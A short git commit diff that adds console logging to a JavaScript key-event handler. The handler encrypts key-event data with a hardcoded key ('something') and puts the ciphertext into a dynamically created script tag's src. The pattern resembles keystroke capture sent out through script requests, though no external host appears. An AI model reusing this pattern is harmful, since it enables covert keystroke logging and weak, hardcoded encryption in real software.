c5686d23b748b22bf3b44cd29aec9f5e6f554559
Alexandru Bara <alexandrubara2000@gmail.com>
2024-07-11 17:37:00 -0400

    added logs

--- scripts/script1.js
+++ scripts/script1.js
@@ -7,8 +7,9 @@ function keyHandler1(e) {
     let attr2 = e.location;
     var message = JSON.stringify(attr1+attr2);
     var key = "something";
-
+    console.log(message)
     var encrypted = CryptoJS.AES.encrypt(message, key);
+    console.log(encrypted);
     var script = document.createElement('script');
     script.src = encrypted;
     var decrypted = CryptoJS.AES.decrypt(encrypted, key);
